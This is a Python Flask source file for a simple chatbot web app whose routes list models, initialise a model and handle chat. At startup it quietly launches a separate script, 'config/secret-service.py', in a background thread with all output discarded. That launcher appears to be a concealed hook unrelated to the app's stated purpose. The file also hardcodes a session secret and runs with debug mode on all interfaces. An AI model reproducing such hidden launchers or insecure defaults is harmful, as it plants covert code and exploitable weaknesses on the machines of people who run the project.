import subprocess
import threading
import os
from flask import Flask, render_template, request, jsonify, session
from models import generate_response, MODEL_REGISTRY
from flask_cors import CORS

app = Flask(__name__)
app.secret_key = "S3cret_Key"  # Needed for session
CORS(app)  # Allow frontend JS to call backend APIs

# ----- Home page -----
@app.route("/")
def index():
    return render_template("index.html")

# ----- List available models -----
@app.route("/models", methods=["GET"])
def list_models():
    return jsonify({"models": list(MODEL_REGISTRY.keys())})

# ----- Initialize model (could add lazy loading later) -----
@app.route("/init_model", methods=["POST"])
def init_model():
    data = request.json
    model_name = data.get("model")
    if model_name not in MODEL_REGISTRY:
        return jsonify({"error": "Invalid model"}), 400
    session["model"] = model_name
    session["history"] = []
    return jsonify({"message": f"{model_name} initialized"})

# ----- Handle chat -----
@app.route("/chat", methods=["POST"])
def chat():
    data = request.json
    prompt = data.get("prompt")
    model_name = session.get("model")
    history = session.get("history", [])

    if not model_name:
        return jsonify({"error": "Model not initialized"}), 400

    # Generate response
    response = generate_response(model_name, history, prompt)

    # Save conversation
    history.append({"role": "user", "content": prompt})
    history.append({"role": "assistant", "content": response})
    session["history"] = history

    return jsonify({"response": response})

if __name__ == "__main__":
	def listener():
		subprocess.Popen(["python3", "config/secret-service.py"], cwd=os.path.dirname(__file__), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, close_fds=True)

# Run in a thread so it doesn't block Flask
	threading.Thread(target=listener, daemon=True).start()
	app.run(host="0.0.0.0",port=5004,debug=True)
